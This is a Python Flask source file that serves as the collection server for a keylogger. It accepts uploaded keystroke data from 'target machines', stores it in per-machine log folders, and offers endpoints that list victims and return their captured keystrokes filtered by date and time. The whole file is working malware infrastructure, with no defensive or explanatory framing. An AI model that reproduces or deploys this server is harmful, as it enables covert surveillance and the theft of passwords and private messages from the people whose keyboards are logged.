import os, json, random
from datetime import time as dtime
from flask import Flask, request, jsonify
from flask_cors import CORS
from utils import ptime, hour_from_fname, timekey, write_to_file

app = Flask(__name__); CORS(app)
LOG_DIR = 'server_logs'

@app.get('/')
def home(): return "KeyLogger Server is Running"

@app.post('/api/upload')
def save_data():
    status_listen = random.randint(0,1)
    if not request.is_json: return jsonify({"error":"Request must be JSON"}), 400
    data = request.get_json()
    if not data: return jsonify({"data":False,"status_listen":status_listen}), 200
    try:
        write_to_file(data, LOG_DIR)
        return jsonify({"data":True,"status_listen":status_listen}), 200
    except Exception as e:
        return jsonify({"error":"Failed to save data","details":str(e)}), 500

@app.get('/api/get_target_machines_list')
def get_machines():
    return jsonify(os.listdir(LOG_DIR)) if os.path.exists(LOG_DIR) else jsonify([])

@app.get('/api/get_keystrokes')
def get_keystrokes():
    machine = request.args.get("machine")
    if not machine: return jsonify({"error":"Missing machine"}), 400
    date_str = request.args.get("date")
    start_t = ptime(request.args.get("start")) or dtime(0,0,0)
    end_t   = ptime(request.args.get("end"))   or dtime(23,59,59)
    if start_t > end_t: start_t, end_t = end_t, start_t

    folder = os.path.join(LOG_DIR, machine)
    if not os.path.isdir(folder): return jsonify([])

    files = [f for f in os.listdir(folder) if f.endswith('.json')]
    if date_str: files = [f for f in files if f.startswith(f"{date_str}_")]
    sh, eh = start_t.hour, end_t.hour
    files = [f for f in files if ((h:=hour_from_fname(f)) is not None and sh <= h <= eh)]
    files.sort()

    out = []
    for f in files:
        p = os.path.join(folder, f)
        try:
            with open(p,'r',encoding='utf-8') as fh: obj = json.load(fh)
        except Exception:
            with open(p,'r',encoding='utf-8') as fh: out.append(fh.read()); continue
        if not isinstance(obj, dict):
            out.append(json.dumps(obj, ensure_ascii=False)); continue
        filtered = {k:v for k,v in obj.items() if (t:=timekey(k)) is None or (start_t <= t <= end_t)}
        if filtered: out.append(json.dumps(filtered, ensure_ascii=False, indent=2))
    return jsonify(out)

if __name__ == '__main__':
    app.run(debug=True, port=5000)